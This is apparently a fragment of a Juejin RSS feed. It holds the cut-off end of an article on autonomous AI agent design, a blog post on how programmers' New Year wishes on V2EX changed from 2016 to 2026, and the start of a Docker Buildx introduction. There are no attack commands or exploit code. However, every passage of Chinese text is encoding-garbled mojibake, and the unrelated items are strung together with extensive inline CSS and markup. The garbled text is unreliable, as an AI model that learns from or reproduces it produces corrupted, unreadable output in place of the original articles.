<h4 data-id="heading-20">5.2 é¿å‘æŒ‡å—ï¼ˆè¡€æ³ªæ•™è®­ï¼‰</h4>
<ol>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå®šæœŸæ£€æŸ¥å‘é‡å­˜å‚¨å¤§å°ï¼Œè®¾ç½®<code>max_memory_items</code></li>
<li><strong>æ­»å¾ªç¯é¢„é˜²</strong>ï¼šå¼ºåˆ¶ä¸­æ–­æ¡ä»¶<code>max_iterations=10</code></li>
<li><strong>å†²çªè§£å†³</strong>ï¼šé‡‡ç”¨ä¼˜å…ˆçº§æŠ¢å ç­–ç•¥ï¼ˆç¤ºä¾‹ä»£ç è§GitHubï¼‰</li>
<li><strong>å®‰å…¨éš”ç¦»</strong>ï¼šæ•æ„Ÿå·¥å…·è°ƒç”¨éœ€åŒé‡éªŒè¯</li>
</ol>
<hr/>
<h3 data-id="heading-21">ç»“è®ºä¸æŒ‘æˆ˜</h3>
<p>é€šè¿‡æœ¬æ–‡çš„æŠ€æœ¯æ‹†è§£ï¼Œç›¸ä¿¡å¼€å‘è€…å·²æŒæ¡æ„å»ºè‡ªä¸»Agentç³»ç»Ÿçš„æ ¸å¿ƒæ–¹æ³•ã€‚ä½†æˆ‘ä»¬å¿…é¡»æ¸…é†’è®¤è¯†åˆ°ï¼š<strong>å½“Agentè·å¾—è¶Šå¤šçš„è‡ªä¸»æƒï¼Œè´£ä»»æœºåˆ¶å°±è¶Šå¤æ‚</strong>ã€‚æœ€åæŠ›å‡ºä¸¤ä¸ªå…³é”®é—®é¢˜ä¾›æ€è€ƒï¼š</p>
<ol>
<li>å¦‚ä½•è®¾è®¡<strong>å¯éªŒè¯çš„é“å¾·çº¦æŸå±‚</strong>ï¼Œé˜²æ­¢ç›®æ ‡æ›²è§£ï¼ˆGoal Misgeneralizationï¼‰ï¼Ÿ</li>
<li>åœ¨<strong>å¤šAgentç»æµç³»ç»Ÿ</strong>ä¸­ï¼Œæ€æ ·çš„æ¿€åŠ±æœºåˆ¶æ‰èƒ½é¿å…èµ„æºå„æ–­ï¼Ÿ</li>
</ol>
<blockquote>
<p>å®æˆ˜ä»£ç åº“åŠæ¶æ„å›¾å®Œæ•´ç‰ˆï¼š<br/>
GitHubï¼šgithub.com/AgentRevolution2026ï¼ˆè¯·å‹¿ç›´æ¥å¤åˆ¶ç”Ÿäº§ç¯å¢ƒä»£ç ï¼‰<br/>
<strong>æŠ€æœ¯æ¼”è¿›é€Ÿåº¦è¿œè¶…é¢„æœŸï¼Œä»Šæ—¥çš„å‰æ²¿æ¢ç´¢å°†æ˜¯æ˜æ—¥çš„ç”Ÿå­˜å¿…å¤‡æŠ€èƒ½</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨‹åºå‘˜è¿‘åå¹´æ–°å¹´æ„¿æœ›ï¼Œéƒ½æœ‰å“ªäº›å˜åŒ–ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592876744526889010</link>    <guid>https://juejin.cn/post/7592876744526889010</guid>    <pubDate>2026-01-09T02:48:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744526889010" data-draft-id="7592903126178463794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨‹åºå‘˜è¿‘åå¹´æ–°å¹´æ„¿æœ›ï¼Œéƒ½æœ‰å“ªäº›å˜åŒ–ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-09T02:48:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="pany"/> <meta itemprop="url" content="https://juejin.cn/user/2041120304148845"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¨‹åºå‘˜è¿‘åå¹´æ–°å¹´æ„¿æœ›ï¼Œéƒ½æœ‰å“ªäº›å˜åŒ–ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2041120304148845/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    pany
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:48:24.000Z" title="Fri Jan 09 2026 02:48:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸å°‘äº’è”ç½‘ä»ä¸šè€…åº”è¯¥éƒ½çŸ¥é“Â V2EX è¿™ä¸ªç¤¾åŒºï¼Œå®ƒæ—©æœŸå°±ä»¥æœ‰ä»·å€¼æœ‰æ·±åº¦çš„è®¨è®ºæ°›å›´é—»åã€‚è¿™å‡ å¤©ç«™å†…éƒ½åœ¨è®¨è®º 2026 æ–°å¹´çš„è§„åˆ’ï¼Œè¿™æ—¶æœ‰ä¸€ä¸ªå«Â <strong>su3sl3h06</strong>Â çš„ç”¨æˆ·å¤§ä½¬å› ä¸ºå¥½å¥‡å’Œæ„Ÿæ…¨ï¼Œå†™è„šæœ¬è€ƒå¤äº†ç«™å†…<strong>ä» 2016 å¹´åˆ° 2026 å¹´è¿™åå¹´çš„ â€œæ–°å¹´æ„¿æœ›/è§„åˆ’â€ è´´</strong>ï¼Œæˆ‘è§‰å¾—éå¸¸æœ‰æ„ä¹‰ï¼Œåœ¨è¿™é‡Œåˆ†äº«ç»™å¤§å®¶ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd3d781d781d497289a700e57d5dab9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768532181&amp;x-signature=iTi1T%2BMVj%2BOVCRMXL%2BpC5NwOh5k%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>2016 å¹´</strong></p>
<p>è¿™æ—¶å€™çš„æˆ‘è¿˜å¤§ä¸€åœ¨å¤§å­¦æœºæˆ¿ç¿»é˜…ç€ C è¯­è¨€ç¨‹åºè®¾è®¡æ•™æå‘¢ï¼Œä½†å¥½åœ¨å·²ç»ä¸æ˜¯è¢«äººåæ§½çš„è°­æµ©å¼ºç‰ˆæœ¬äº†å“ˆå“ˆå“ˆã€‚</p>
<p>è€Œç¤¾åŒºé‡Œå·²ç»ä»ä¸šçš„å‰è¾ˆä»¬ä¸»è¦ä»¥å‡èŒåŠ è–ªåˆ›ä¸šç­‰ä¸ºç›®æ ‡ï¼Œçœ‹å¾—å‡º<strong>ä¸€ç‰‡æ¬£æ¬£å‘è£</strong>ã€‚</p>
<p><strong>2018 å¹´</strong></p>
<p>ç°åœ¨æˆ‘å·²ç»å¤§ä¸‰äº†ï¼Œæ­¤æ—¶æˆ‘ä¸ä»…èƒ½ç†Ÿç»ƒç”¨ C å’Œ Java å†™å„ç§å„æ ·çš„ â€œç›Šæ™ºè¶£å‘³ç¼–ç¨‹é¢˜â€ ï¼Œæ¯”å¦‚ä»€ä¹ˆå›æ–‡æ•°ã€æ°´ä»™èŠ±æ•°ï¼Œè¿˜æŒæ¡äº†ç¨‹åºå‘˜çš„åœ£ç»ã€Šæ•°æ®ç»“æ„ä¸ç®—æ³•ã€‹ï¼Œè™½ç„¶ç°åœ¨ä¹Ÿå¿˜å¾—å·®ä¸å¤šäº†...</p>
<p>è€Œæ­¤æ—¶çš„ç¤¾åŒºå·²ç»æ²¡æœ‰äº†å‘è£çš„è¿¹è±¡ï¼Œå°è±¡ä¸­äº’è”ç½‘å¯’å†¬è¿™ä¸ªçŸ¥ä¹ä¸Šçš„å¹´æ›´è¯é¢˜å°±åœ¨è¿™å¹´è¯ç”Ÿçš„ã€‚</p>
<p><strong>è®°å¾—å½“æ—¶æˆ‘ä¸€è¾¹æ£€ç´¢ç€ã€Œå‰ç«¯å­¦ä¹ è·¯çº¿ã€ä¸€è¾¹åˆ·ç€ã€Œå‰ç«¯å·²ç»é¥±å’Œã€çš„è¯é¢˜ï¼Œæœ‰ä¸€è‚¡è¯´ä¸å‡ºæ¥çš„æ»‹å‘³...</strong></p>
<p><strong>2019 å¹´</strong></p>
<p>æˆ‘ç»ˆäºå¤§å››äº†ï¼Œå­¦æ ¡å¼€å§‹ç»„ç»‡å„ç§å®è®­ï¼ŒåŒå­¦ä»¬ä¹Ÿé™†ç»­æŠ¥åå„ç§äº”èŠ±å…«é—¨çš„åŸ¹è®­ç­æˆ–è€…èµ°è€ƒç ”è·¯çº¿ã€‚<br/>
å¥½æ¶ˆæ¯æ˜¯æˆ‘è‡ªå­¦äº†å‰ç«¯ï¼Œå·²ç»åšå¥½äº†ç›´æ¥å®ä¹ çš„å‡†å¤‡ï¼Œ<strong>åæ¶ˆæ¯æ˜¯äº’è”ç½‘çœŸçš„å¯’å†¬äº†...</strong></p>
<p><strong>2020 å¹´</strong></p>
<p>æˆ‘ä»æˆéƒ½æŸå®‰å…¨å…¬å¸ç»“æŸå®ä¹ ï¼Œå›åˆ°é‡åº†é‚®ç”µå¤§å­¦çš„ä¸€å®¶æ¸©æš–çš„å°å…¬å¸ç»§ç»­æˆ‘çš„ç¨‹åºäººç”Ÿã€‚</p>
<p>è¿™æ—¶çš„ç¤¾åŒºï¼Œå·²ç»å¼€å§‹é¢‘ç¹å‡ºç°<strong>è£å‘˜</strong>çš„å…³é”®å­—äº†ï¼Œè€Œæˆ‘åœ¨èˆ’é€‚åœˆé‡Œå¾…ç€ï¼Œæ¸æ¸å¿½è§†äº†å¤–é¢çš„å±æœºå››ä¼ã€‚</p>
<p><strong>2021 ~ 2023 å¹´</strong></p>
<p>ä¼¼ä¹ç—…æ¯’æˆäº†å‹æ­»éª†é©¼çš„æœ€åä¸€æ ¹ç¨»è‰ï¼Œæˆ‘å’Œç¤¾åŒºçš„å…³é”®å­—éƒ½æ˜¯<strong>è‹Ÿæ´»ç€</strong>ï¼Œåœ¨æ­¤æœŸé—´æˆ‘è¿˜ç»å†äº†è·³æ§½å’Œè£å‘˜ï¼Œæœ‰æœºä¼šå†è¯¦ç»†å†™å§ï¼Œæ„Ÿè§‰æ¯ä¸€æ®µéƒ½æ˜¯å€¼å¾—å›é¡¾çš„æœ‰ä»·å€¼çš„ç»å†ã€‚</p>
<p><strong>2024 ~ 2026 å¹´</strong></p>
<p>æˆ‘å’Œç¤¾åŒºå‡ ä¹åŒé¢‘ï¼Œå…³é”®å­—éƒ½æ˜¯<strong>å‰¯ä¸š</strong>å’Œ<strong>ä¿ä½å·¥ä½œ</strong>ã€‚</p>
<p>æˆ‘åœ¨ 2024 å¹´å°è¯•å°†è‡ªå·±çš„å¼€æºé¡¹ç›®å¼•å…¥ä¸€äº›ä»˜è´¹çš„æœåŠ¡ï¼Œå¯¹æˆ‘æ¥è¯´è¦æ˜¯èƒ½å°†å¼€æºè¿™ä¸ªçˆ±å¥½å˜ç°å°±å¤ªå®Œç¾äº†ã€‚ä½†æ˜¯ä¸å¤ªå°½äººæ„ï¼Œè´­ä¹°ä»˜è´¹æœåŠ¡çš„å‰æœŸè¿˜æ˜¯è›®å¤šçš„ï¼ŒåæœŸç–äºå®£ä¼ ï¼Œæµé‡è¶Šæ¥è¶Šå°‘è´­ä¹°çš„äººæ•°è‡ªç„¶å°±ä¸‹é™äº†ã€‚ä¸è¿‡è¿™ä¹Ÿæé†’æˆ‘æ˜¯æ—¶å€™è¯¥é‡æ–°é‡è§†å¼€æºé¡¹ç›®çš„æ›´æ–°ä¸å®£ä¼ äº†ï¼</p>
<p>æœ‰æ„æ€çš„æ˜¯<strong>ä¿ä½å·¥ä½œ</strong>è¿™ä¸ªå…³é”®å­—åœ¨ä»Šå¹´åˆ·å±çº§çš„å‡ºç°ï¼Œè¿™æ˜¯ä¸æ˜¯ä¹Ÿæ„å‘³ç€ï¼Œå¯¹å¤§éƒ¨åˆ†äººæ¥è¯´ï¼Œè£å‘˜å·²ç»æ˜¯æ¯å¹´æ¿ä¸Šé’‰é’‰çš„äº‹æƒ…äº†ï¼Ÿ</p>
<hr/>
<p><strong>æœ€åæ€»ç»“ä¸€ä¸‹è¿™åå¹´ï¼Œåƒæ˜¯ä¸€æ¡æŠ›ç‰©çº¿ï¼š</strong></p>
<ul>
<li>ä¸Šå‡æœŸ (2016-2017)ï¼š ä¿¡å¿ƒæ»¡æ»¡ï¼Œç›¸ä¿¡åŠªåŠ›å°±èƒ½æ”¹å˜å‘½è¿ï¼Œç›¸ä¿¡äº’è”ç½‘çš„çº¢åˆ©æ°¸è¿œåƒä¸å®Œ</li>
<li>éœ‡è¡æœŸ (2018-2019)ï¼š ä¾ç„¶åœ¨åŠªåŠ›ï¼Œä½†å¼€å§‹æ„Ÿåˆ°åƒåŠ›ï¼Œå¼€å§‹ç”¨å¹½é»˜æ¶ˆè§£ç„¦è™‘</li>
<li>ä¸‹å æœŸ (2020-2022)ï¼š ä¸å¯æŠ—åŠ›è¢­æ¥ï¼Œå¿ƒæ€å´©å¡Œï¼Œä»å¥‹æ–—è½¬å‘èººå¹³</li>
<li>ä½è°·å¹³å°æœŸ (2023-2026)ï¼š æ¥å—ç°å®ï¼Œä¸å†åšæ¢¦ã€‚â€œä¿ä½å·¥ä½œâ€ æˆä¸ºæœ€é«˜çš„å¥¢æœ›ï¼Œâ€œèº«ä½“å¥åº·â€ æˆä¸ºæœ€åçš„åº•çº¿</li>
</ul>
<hr/>
<p>å¥½äº†ï¼Œæ–‡ç« å°±åˆ°è¿™ï¼ŒæœŸå¾…ä¸‹æœŸä¸ä½ ç›¸è§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Buildxï¼šæ„å»ºå®¹å™¨é•œåƒçš„ç‘å£«å†›åˆ€]]></title>    <link>https://juejin.cn/post/7592819937652752399</link>    <guid>https://juejin.cn/post/7592819937652752399</guid>    <pubDate>2026-01-09T00:40:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592819937652752399" data-draft-id="7592819937652736015" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Buildxï¼šæ„å»ºå®¹å™¨é•œåƒçš„ç‘å£«å†›åˆ€"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-09T00:40:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Buildxï¼šæ„å»ºå®¹å™¨é•œåƒçš„ç‘å£«å†›åˆ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T00:40:48.000Z" title="Fri Jan 09 2026 00:40:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Buildx</h2>
<p>Docker Buildx æ˜¯ä¸€ä¸ª Docker CLI æ’ä»¶ï¼Œå®ƒåŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmoby%2Fbuildkit" target="_blank" title="https://github.com/moby/buildkit" ref="nofollow noopener noreferrer">BuildKit</a> æä¾›äº†æ‰©å±•çš„æ„å»ºèƒ½åŠ›ã€‚å®ƒæ—¨åœ¨æä¾›ä¸ <code>docker build</code> ç±»ä¼¼çš„ç”¨æˆ·ç•Œé¢ï¼ŒåŒæ—¶è§£é” BuildKit çš„å…¨éƒ¨åŠŸèƒ½é›†ã€‚Buildx æ”¯æŒå¤šä¸ªæ„å»ºå™¨å®ä¾‹ã€ç”¨äºè·¨å¹³å°é•œåƒçš„å¤šèŠ‚ç‚¹æ„å»ºã€Compose æ„å»ºæ”¯æŒä»¥åŠä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.docker.com%2Fbuild%2Fbake%2F" target="_blank" title="https://docs.docker.com/build/bake/" ref="nofollow noopener noreferrer">Bake</a> è¿›è¡Œé«˜çº§æ„å»ºã€‚</p>
<h3 data-id="heading-1">åŠŸèƒ½ç‰¹æ€§</h3>
<p>Buildx é›†æˆäº† BuildKit çš„æ‰€æœ‰èƒ½åŠ›ï¼Œå¹¶æä¾›äº†ä»¥ä¸‹å…³é”®ç‰¹æ€§ï¼š</p>
<ul>
<li><strong>ç†Ÿæ‚‰çš„ç”¨æˆ·ä½“éªŒ</strong>ï¼šå‘½ä»¤ç•Œé¢ä¸ä¼ ç»Ÿçš„ <code>docker build</code> ç›¸ä¼¼ï¼Œé™ä½äº†å­¦ä¹ æˆæœ¬ã€‚</li>
<li><strong>å®Œæ•´çš„ BuildKit èƒ½åŠ›</strong>ï¼šåˆ©ç”¨å®¹å™¨é©±åŠ¨ç¨‹åºï¼Œæ”¯æŒæ‰€æœ‰ BuildKit çš„é«˜çº§åŠŸèƒ½ã€‚</li>
<li><strong>å¤šä¸ªæ„å»ºå™¨å®ä¾‹æ”¯æŒ</strong>ï¼šå¯ä»¥åˆ›å»ºå’Œç®¡ç†å¤šä¸ªç‹¬ç«‹çš„æ„å»ºå™¨ç¯å¢ƒã€‚</li>
